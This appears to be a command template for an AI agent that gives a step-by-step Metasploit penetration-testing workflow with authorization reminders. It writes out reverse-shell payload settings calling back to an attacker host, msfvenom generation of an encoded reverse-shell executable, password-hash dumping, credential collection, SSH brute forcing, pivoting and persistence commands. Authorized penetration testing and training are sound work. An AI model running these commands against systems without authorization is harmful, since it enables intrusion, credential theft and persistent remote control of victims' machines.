Metasploit exploitation workflow on: $ARGUMENTS

## Pre-flight
- Confirm target is in scope and exploitation is authorized
- Identify target OS, services, and known vulnerabilities from recon phase
- Set up listener host (LHOST) and verify network connectivity to target

## Phase 1: Search & Select
1. Start console: `msfconsole -q`
2. Search exploits: `search type:exploit name:<service>` or `search cve:YYYY-XXXXX`
3. Search by platform: `search platform:windows type:exploit`
4. Check exploit info: `info <module>` -- review reliability rank, targets, references
5. Select: `use exploit/multi/handler` or `use exploit/<path>`

## Phase 2: Configure & Launch
1. Show options: `show options` -- review required settings
2. Set target: `set RHOSTS <target-ip>` / `set RPORT <port>`
3. Set payload: `set PAYLOAD windows/x64/meterpreter/reverse_tcp`
4. Set listener: `set LHOST <attacker-ip>` / `set LPORT 4444`
5. Check: `show options` -- verify all required fields populated
6. Exploit: `exploit` or `run` (-j for background)

## Phase 3: Meterpreter Post-Exploitation
1. **Situational awareness**: `sysinfo`, `getuid`, `getpid`, `ps`
2. **Privilege check**: `getsystem` -- attempt auto-escalation
3. **Credentials**: `hashdump`, `run post/windows/gather/credentials/credential_collector`
4. **Network**: `ipconfig`, `route`, `arp`, `netstat`
5. **File ops**: `upload`, `download`, `cat`, `edit`, `search -f *.conf`
6. **Pivot**: `run autoroute -s <subnet>`, `portfwd add -l 8080 -p 80 -r <internal>`
7. **Persistence**: `run persistence -U -i 30 -p 4444 -r <lhost>` (if authorized)
8. **Migrate**: `migrate <pid>` -- move to stable process

## Phase 4: Auxiliary Modules
1. Scanner: `use auxiliary/scanner/smb/smb_ms17_010` -- vuln check
2. Brute force: `use auxiliary/scanner/ssh/ssh_login`
3. Enumeration: `use auxiliary/scanner/http/http_version`
4. Fuzzing: `use auxiliary/fuzzers/`
5. Database: `db_nmap <target>`, `hosts`, `services`, `vulns`

## Phase 5: Payload Generation
1. List payloads: `msfvenom -l payloads | grep <os>`
2. Generate: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f exe -o shell.exe`
3. Encoders: `msfvenom -e x86/shikata_ga_nai -i 5` -- evasion (limited effectiveness)
4. Formats: exe, elf, dll, ps1, py, war, asp, jsp, raw

## Tools
msfconsole, msfvenom, msfdb, Metasploit Pro (commercial)

## Output
Save session logs to engagements/<target>/exploits/msf-session-<date>.md

## Framework Mapping
- MITRE ATT&CK: TA0002 (Execution) -> T1059 (Command and Scripting Interpreter)
- MITRE ATT&CK: TA0001 (Initial Access) -> T1190 (Exploit Public-Facing Application)
- Cyber Kill Chain: Phase 5 -- Installation, Phase 6 -- Command & Control
- CEH v12: Module 06 -- System Hacking / OSCP Core Methodology

## Safety
Use exploit/multi/handler for catching shells. Never run exploits against production without explicit written authorization.
